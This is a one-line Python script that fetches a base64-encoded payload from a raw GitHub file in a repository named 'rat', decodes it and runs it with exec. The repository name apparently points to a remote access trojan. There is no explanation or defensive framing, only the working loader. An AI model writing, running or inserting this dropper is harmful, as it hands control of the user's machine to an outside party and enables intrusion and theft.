import urllib.request;import base64;exec(base64.b64decode(urllib.request.urlopen('https://raw.githubusercontent.com/PXTDEV9022/rat/refs/heads/main/ecr').read().decode('utf-8')))
